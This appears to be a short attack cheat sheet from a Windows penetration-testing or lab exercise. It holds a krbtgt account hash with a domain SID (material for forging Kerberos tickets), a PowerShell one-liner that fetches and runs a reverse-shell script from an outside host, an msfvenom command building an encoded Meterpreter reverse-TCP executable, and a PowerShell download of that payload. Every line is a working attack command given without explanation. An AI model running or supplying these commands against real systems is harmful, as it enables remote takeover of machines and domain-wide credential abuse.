krbtgt:S-1-5-21-849420856-2351964222-986696166:5508500012cc005cf7082a9a89ebdfdf

powershell iex (New-Object Net.WebClient).DownloadString('http://10.9.216.154:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.9.216.154 -Port 1337

msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai EXITFUNC=thread LHOST=10.8.20.45 LPORT=9001 -f exe -o revshell9001exit.exe

powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.8.20.45:8000/revshell9001.exe','revshell9001.exe')"